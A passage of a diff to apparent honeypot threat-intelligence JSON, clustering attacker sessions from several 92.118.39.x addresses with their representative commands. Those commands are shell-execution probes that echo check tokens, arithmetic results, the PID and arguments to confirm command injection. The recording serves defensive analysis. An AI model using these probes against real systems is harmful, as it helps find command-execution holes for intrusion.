-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_cb4fb270e84a19b30a6b089ba67748d9_small_math'\"'\"' \"$((204*95+56))\"'",
-        "(204*95+56",
-        "printf '\\n%s|%s\\n' 'check_cb4fb270e84a19b30a6b089ba67748d9_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_cb4fb270e84a19b30a6b089ba67748d9_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_cb4fb270e84a19b30a6b089ba67748d9_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_cb4fb270e84a19b30a6b089ba67748d9_arg1'\"'\"' '\"'\"'check_cb4fb270e84a19b30a6b089ba67748d9_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_cb4fb270e84a19b30a6b089ba67748d9_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_cb4fb270e84a19b30a6b089ba67748d9_arg1' 'check_cb4fb270e84a19b30a6b089ba67748d9_arg2'; printf '\\n%s|%s\\n' 'check_cb4fb270e84a19b30a6b089ba67748d9_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_cb4fb270e84a19b30a6b089ba67748d9() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_cb4fb270e84a19b30a6b089ba67748d9_small_function'\"'\"' \"$1|$#\"; }; f_check_cb4fb270e84a19b30a6b089ba67748d9 '\"'\"'check_cb4fb270e84a19b30a6b089ba67748d9_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_86561b312d081b2e787ff688fa4a7acd_small_control'\"'\"' '\"'\"'check_86561b312d081b2e787ff688fa4a7acd'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_86561b312d081b2e787ff688fa4a7acd_small_control' 'check_86561b312d081b2e787ff688fa4a7acd'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_86561b312d081b2e787ff688fa4a7acd_small_math'\"'\"' \"$((493*25+53))\"'",
+        "(493*25+53",
+        "printf '\\n%s|%s\\n' 'check_86561b312d081b2e787ff688fa4a7acd_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_86561b312d081b2e787ff688fa4a7acd_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_86561b312d081b2e787ff688fa4a7acd_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_86561b312d081b2e787ff688fa4a7acd_arg1'\"'\"' '\"'\"'check_86561b312d081b2e787ff688fa4a7acd_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_86561b312d081b2e787ff688fa4a7acd_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_86561b312d081b2e787ff688fa4a7acd_arg1' 'check_86561b312d081b2e787ff688fa4a7acd_arg2'; printf '\\n%s|%s\\n' 'check_86561b312d081b2e787ff688fa4a7acd_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_86561b312d081b2e787ff688fa4a7acd() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_86561b312d081b2e787ff688fa4a7acd_small_function'\"'\"' \"$1|$#\"; }; f_check_86561b312d081b2e787ff688fa4a7acd '\"'\"'check_86561b312d081b2e787ff688fa4a7acd_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-90af5d4002fa",
-          "src_ip": "92.118.39.14",
+          "session_id": "IR-f53eb3c066f1",
+          "src_ip": "92.118.39.77",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T17:44:27.917821Z"
+          "timestamp": "2026-11-18T01:26:02.694658Z"
         }
       ]
     },
@@ -304,31 +315,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "92.118.39.77"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "a731584a87ff2737",
+      "sequence_hash": "8d326206b35688e2",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_01c66e23ff9468f5e953b29269cd6283_small_control'\"'\"' '\"'\"'check_01c66e23ff9468f5e953b29269cd6283'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_01c66e23ff9468f5e953b29269cd6283_small_control' 'check_01c66e23ff9468f5e953b29269cd6283'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_01c66e23ff9468f5e953b29269cd6283_small_math'\"'\"' \"$((455*448+67))\"'",
-        "(455*448+67",
-        "printf '\\n%s|%s\\n' 'check_01c66e23ff9468f5e953b29269cd6283_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_01c66e23ff9468f5e953b29269cd6283_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_01c66e23ff9468f5e953b29269cd6283_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_01c66e23ff9468f5e953b29269cd6283_arg1'\"'\"' '\"'\"'check_01c66e23ff9468f5e953b29269cd6283_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_01c66e23ff9468f5e953b29269cd6283_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_01c66e23ff9468f5e953b29269cd6283_arg1' 'check_01c66e23ff9468f5e953b29269cd6283_arg2'; printf '\\n%s|%s\\n' 'check_01c66e23ff9468f5e953b29269cd6283_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_01c66e23ff9468f5e953b29269cd6283() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_01c66e23ff9468f5e953b29269cd6283_small_function'\"'\"' \"$1|$#\"; }; f_check_01c66e23ff9468f5e953b29269cd6283 '\"'\"'check_01c66e23ff9468f5e953b29269cd6283_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8d2bf0d08f470e05b0b6c6652c116a28_small_control'\"'\"' '\"'\"'check_8d2bf0d08f470e05b0b6c6652c116a28'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_8d2bf0d08f470e05b0b6c6652c116a28_small_control' 'check_8d2bf0d08f470e05b0b6c6652c116a28'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8d2bf0d08f470e05b0b6c6652c116a28_small_math'\"'\"' \"$((248*207+56))\"'",
+        "(248*207+56",
+        "printf '\\n%s|%s\\n' 'check_8d2bf0d08f470e05b0b6c6652c116a28_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8d2bf0d08f470e05b0b6c6652c116a28_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_8d2bf0d08f470e05b0b6c6652c116a28_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_8d2bf0d08f470e05b0b6c6652c116a28_arg1'\"'\"' '\"'\"'check_8d2bf0d08f470e05b0b6c6652c116a28_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8d2bf0d08f470e05b0b6c6652c116a28_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_8d2bf0d08f470e05b0b6c6652c116a28_arg1' 'check_8d2bf0d08f470e05b0b6c6652c116a28_arg2'; printf '\\n%s|%s\\n' 'check_8d2bf0d08f470e05b0b6c6652c116a28_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_8d2bf0d08f470e05b0b6c6652c116a28() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8d2bf0d08f470e05b0b6c6652c116a28_small_function'\"'\"' \"$1|$#\"; }; f_check_8d2bf0d08f470e05b0b6c6652c116a28 '\"'\"'check_8d2bf0d08f470e05b0b6c6652c116a28_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-7afbb318c550",
-          "src_ip": "92.118.39.14",
+          "session_id": "IR-aaae9bc16618",
+          "src_ip": "92.118.39.77",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T17:46:30.207762Z"
+          "timestamp": "2026-11-18T01:27:11.400701Z"
         }
       ]
     },
@@ -341,31 +352,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "92.118.39.64"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "dfee0b40e925e761",
+      "sequence_hash": "10da73089752579c",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_0baf28cae6a76a29c062cd33d420570a_small_control'\"'\"' '\"'\"'check_0baf28cae6a76a29c062cd33d420570a'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_0baf28cae6a76a29c062cd33d420570a_small_control' 'check_0baf28cae6a76a29c062cd33d420570a'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_0baf28cae6a76a29c062cd33d420570a_small_math'\"'\"' \"$((1*533+82))\"'",
-        "(1*533+82",
-        "printf '\\n%s|%s\\n' 'check_0baf28cae6a76a29c062cd33d420570a_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_0baf28cae6a76a29c062cd33d420570a_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_0baf28cae6a76a29c062cd33d420570a_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_0baf28cae6a76a29c062cd33d420570a_arg1'\"'\"' '\"'\"'check_0baf28cae6a76a29c062cd33d420570a_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_0baf28cae6a76a29c062cd33d420570a_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_0baf28cae6a76a29c062cd33d420570a_arg1' 'check_0baf28cae6a76a29c062cd33d420570a_arg2'; printf '\\n%s|%s\\n' 'check_0baf28cae6a76a29c062cd33d420570a_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_0baf28cae6a76a29c062cd33d420570a() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_0baf28cae6a76a29c062cd33d420570a_small_function'\"'\"' \"$1|$#\"; }; f_check_0baf28cae6a76a29c062cd33d420570a '\"'\"'check_0baf28cae6a76a29c062cd33d420570a_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_eda03823920ad2ba917bde4e8b8c2e59_small_control'\"'\"' '\"'\"'check_eda03823920ad2ba917bde4e8b8c2e59'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_eda03823920ad2ba917bde4e8b8c2e59_small_control' 'check_eda03823920ad2ba917bde4e8b8c2e59'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_eda03823920ad2ba917bde4e8b8c2e59_small_math'\"'\"' \"$((16*498+14))\"'",
+        "(16*498+14",
+        "printf '\\n%s|%s\\n' 'check_eda03823920ad2ba917bde4e8b8c2e59_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_eda03823920ad2ba917bde4e8b8c2e59_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_eda03823920ad2ba917bde4e8b8c2e59_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_eda03823920ad2ba917bde4e8b8c2e59_arg1'\"'\"' '\"'\"'check_eda03823920ad2ba917bde4e8b8c2e59_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_eda03823920ad2ba917bde4e8b8c2e59_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_eda03823920ad2ba917bde4e8b8c2e59_arg1' 'check_eda03823920ad2ba917bde4e8b8c2e59_arg2'; printf '\\n%s|%s\\n' 'check_eda03823920ad2ba917bde4e8b8c2e59_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_eda03823920ad2ba917bde4e8b8c2e59() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_eda03823920ad2ba917bde4e8b8c2e59_small_function'\"'\"' \"$1|$#\"; }; f_check_eda03823920ad2ba917bde4e8b8c2e59 '\"'\"'check_eda03823920ad2ba917bde4e8b8c2e59_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-4e73ddfeb7ee",
-          "src_ip": "92.118.39.14",
+          "session_id": "IR-fb3833bf8cbe",
+          "src_ip": "92.118.39.64",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T17:48:32.768682Z"
+          "timestamp": "2026-11-18T02:54:35.459932Z"
         }
       ]
     },
@@ -378,31 +389,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "92.118.39.64"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "a2c7c50bf45e503f",
+      "sequence_hash": "a9a9819b58ab46b9",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f2efba1c5dbfe25f378981346021072a_small_control'\"'\"' '\"'\"'check_f2efba1c5dbfe25f378981346021072a'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_f2efba1c5dbfe25f378981346021072a_small_control' 'check_f2efba1c5dbfe25f378981346021072a'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f2efba1c5dbfe25f378981346021072a_small_math'\"'\"' \"$((378*77+15))\"'",
-        "(378*77+15",
-        "printf '\\n%s|%s\\n' 'check_f2efba1c5dbfe25f378981346021072a_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f2efba1c5dbfe25f378981346021072a_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_f2efba1c5dbfe25f378981346021072a_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_f2efba1c5dbfe25f378981346021072a_arg1'\"'\"' '\"'\"'check_f2efba1c5dbfe25f378981346021072a_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f2efba1c5dbfe25f378981346021072a_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_f2efba1c5dbfe25f378981346021072a_arg1' 'check_f2efba1c5dbfe25f378981346021072a_arg2'; printf '\\n%s|%s\\n' 'check_f2efba1c5dbfe25f378981346021072a_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_f2efba1c5dbfe25f378981346021072a() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f2efba1c5dbfe25f378981346021072a_small_function'\"'\"' \"$1|$#\"; }; f_check_f2efba1c5dbfe25f378981346021072a '\"'\"'check_f2efba1c5dbfe25f378981346021072a_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_a633239819317777da4dd942432fc470_small_control'\"'\"' '\"'\"'check_a633239819317777da4dd942432fc470'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_a633239819317777da4dd942432fc470_small_control' 'check_a633239819317777da4dd942432fc470'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_a633239819317777da4dd942432fc470_small_math'\"'\"' \"$((674*194+62))\"'",
+        "(674*194+62",
+        "printf '\\n%s|%s\\n' 'check_a633239819317777da4dd942432fc470_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_a633239819317777da4dd942432fc470_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_a633239819317777da4dd942432fc470_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_a633239819317777da4dd942432fc470_arg1'\"'\"' '\"'\"'check_a633239819317777da4dd942432fc470_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_a633239819317777da4dd942432fc470_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_a633239819317777da4dd942432fc470_arg1' 'check_a633239819317777da4dd942432fc470_arg2'; printf '\\n%s|%s\\n' 'check_a633239819317777da4dd942432fc470_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_a633239819317777da4dd942432fc470() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_a633239819317777da4dd942432fc470_small_function'\"'\"' \"$1|$#\"; }; f_check_a633239819317777da4dd942432fc470 '\"'\"'check_a633239819317777da4dd942432fc470_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-7ffe90bfa703",
-          "src_ip": "92.118.39.14",
+          "session_id": "IR-77f817ec91c1",
+          "src_ip": "92.118.39.64",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T17:50:37.912550Z"
+          "timestamp": "2026-11-18T02:57:23.605573Z"
         }
       ]
     },
@@ -415,31 +426,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "92.118.39.64"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "f1a7bcf6c9f6bf5c",
+      "sequence_hash": "6780682325dbc8b1",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6acc4d7b7443e8011e190b8a6c6eae85_small_control'\"'\"' '\"'\"'check_6acc4d7b7443e8011e190b8a6c6eae85'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_6acc4d7b7443e8011e190b8a6c6eae85_small_control' 'check_6acc4d7b7443e8011e190b8a6c6eae85'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6acc4d7b7443e8011e190b8a6c6eae85_small_math'\"'\"' \"$((422*16+84))\"'",
-        "(422*16+84",
-        "printf '\\n%s|%s\\n' 'check_6acc4d7b7443e8011e190b8a6c6eae85_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6acc4d7b7443e8011e190b8a6c6eae85_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_6acc4d7b7443e8011e190b8a6c6eae85_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_6acc4d7b7443e8011e190b8a6c6eae85_arg1'\"'\"' '\"'\"'check_6acc4d7b7443e8011e190b8a6c6eae85_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6acc4d7b7443e8011e190b8a6c6eae85_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_6acc4d7b7443e8011e190b8a6c6eae85_arg1' 'check_6acc4d7b7443e8011e190b8a6c6eae85_arg2'; printf '\\n%s|%s\\n' 'check_6acc4d7b7443e8011e190b8a6c6eae85_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_6acc4d7b7443e8011e190b8a6c6eae85() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6acc4d7b7443e8011e190b8a6c6eae85_small_function'\"'\"' \"$1|$#\"; }; f_check_6acc4d7b7443e8011e190b8a6c6eae85 '\"'\"'check_6acc4d7b7443e8011e190b8a6c6eae85_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_55e35ac5f9a7c35df21c7aabd34d500f_small_control'\"'\"' '\"'\"'check_55e35ac5f9a7c35df21c7aabd34d500f'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_55e35ac5f9a7c35df21c7aabd34d500f_small_control' 'check_55e35ac5f9a7c35df21c7aabd34d500f'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_55e35ac5f9a7c35df21c7aabd34d500f_small_math'\"'\"' \"$((54*445+66))\"'",
+        "(54*445+66",
+        "printf '\\n%s|%s\\n' 'check_55e35ac5f9a7c35df21c7aabd34d500f_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_55e35ac5f9a7c35df21c7aabd34d500f_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_55e35ac5f9a7c35df21c7aabd34d500f_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_55e35ac5f9a7c35df21c7aabd34d500f_arg1'\"'\"' '\"'\"'check_55e35ac5f9a7c35df21c7aabd34d500f_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_55e35ac5f9a7c35df21c7aabd34d500f_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_55e35ac5f9a7c35df21c7aabd34d500f_arg1' 'check_55e35ac5f9a7c35df21c7aabd34d500f_arg2'; printf '\\n%s|%s\\n' 'check_55e35ac5f9a7c35df21c7aabd34d500f_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_55e35ac5f9a7c35df21c7aabd34d500f() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_55e35ac5f9a7c35df21c7aabd34d500f_small_function'\"'\"' \"$1|$#\"; }; f_check_55e35ac5f9a7c35df21c7aabd34d500f '\"'\"'check_55e35ac5f9a7c35df21c7aabd34d500f_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-3bb795f2495e",
-          "src_ip": "92.118.39.14",
+          "session_id": "IR-50f497bd77ff",
+          "src_ip": "92.118.39.64",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T17:52:41.487234Z"
+          "timestamp": "2026-11-18T03:00:15.633370Z"
         }
       ]
     },
@@ -452,31 +463,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "92.118.39.64"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "ec87979f0b3dd217",
+      "sequence_hash": "5339ba0e4bf8f439",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f1a4ad9f86b8226b3337973e076f896a_small_control'\"'\"' '\"'\"'check_f1a4ad9f86b8226b3337973e076f896a'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_f1a4ad9f86b8226b3337973e076f896a_small_control' 'check_f1a4ad9f86b8226b3337973e076f896a'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f1a4ad9f86b8226b3337973e076f896a_small_math'\"'\"' \"$((47*844+72))\"'",
-        "(47*844+72",
-        "printf '\\n%s|%s\\n' 'check_f1a4ad9f86b8226b3337973e076f896a_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f1a4ad9f86b8226b3337973e076f896a_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_f1a4ad9f86b8226b3337973e076f896a_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_f1a4ad9f86b8226b3337973e076f896a_arg1'\"'\"' '\"'\"'check_f1a4ad9f86b8226b3337973e076f896a_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f1a4ad9f86b8226b3337973e076f896a_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_f1a4ad9f86b8226b3337973e076f896a_arg1' 'check_f1a4ad9f86b8226b3337973e076f896a_arg2'; printf '\\n%s|%s\\n' 'check_f1a4ad9f86b8226b3337973e076f896a_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_f1a4ad9f86b8226b3337973e076f896a() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f1a4ad9f86b8226b3337973e076f896a_small_function'\"'\"' \"$1|$#\"; }; f_check_f1a4ad9f86b8226b3337973e076f896a '\"'\"'check_f1a4ad9f86b8226b3337973e076f896a_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_d6fb56c406410cc026483db28d440888_small_control'\"'\"' '\"'\"'check_d6fb56c406410cc026483db28d440888'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_d6fb56c406410cc026483db28d440888_small_control' 'check_d6fb56c406410cc026483db28d440888'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_d6fb56c406410cc026483db28d440888_small_math'\"'\"' \"$((201*411+37))\"'",
+        "(201*411+37",
+        "printf '\\n%s|%s\\n' 'check_d6fb56c406410cc026483db28d440888_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_d6fb56c406410cc026483db28d440888_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_d6fb56c406410cc026483db28d440888_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_d6fb56c406410cc026483db28d440888_arg1'\"'\"' '\"'\"'check_d6fb56c406410cc026483db28d440888_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_d6fb56c406410cc026483db28d440888_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_d6fb56c406410cc026483db28d440888_arg1' 'check_d6fb56c406410cc026483db28d440888_arg2'; printf '\\n%s|%s\\n' 'check_d6fb56c406410cc026483db28d440888_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_d6fb56c406410cc026483db28d440888() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_d6fb56c406410cc026483db28d440888_small_function'\"'\"' \"$1|$#\"; }; f_check_d6fb56c406410cc026483db28d440888 '\"'\"'check_d6fb56c406410cc026483db28d440888_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-e54791e7f4bf",
-          "src_ip": "92.118.39.14",
+          "session_id": "IR-28accf83c1e9",
+          "src_ip": "92.118.39.64",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T17:54:46.343406Z"
+          "timestamp": "2026-11-18T03:02:53.043043Z"
         }
       ]
     },
@@ -489,31 +500,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "92.118.39.64"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "024add97d5691a92",
+      "sequence_hash": "58fb48335319282d",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_small_control'\"'\"' '\"'\"'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_small_control' 'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_small_math'\"'\"' \"$((7*716+29))\"'",
-        "(7*716+29",
-        "printf '\\n%s|%s\\n' 'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_arg1'\"'\"' '\"'\"'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_arg1' 'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_arg2'; printf '\\n%s|%s\\n' 'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_small_function'\"'\"' \"$1|$#\"; }; f_check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5 '\"'\"'check_1f2ef2cd2dda82c04e3d5a67f2bc6ff5_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_e2892a4289f994fd152ab791daafc5db_small_control'\"'\"' '\"'\"'check_e2892a4289f994fd152ab791daafc5db'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_e2892a4289f994fd152ab791daafc5db_small_control' 'check_e2892a4289f994fd152ab791daafc5db'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_e2892a4289f994fd152ab791daafc5db_small_math'\"'\"' \"$((168*909+85))\"'",
+        "(168*909+85",
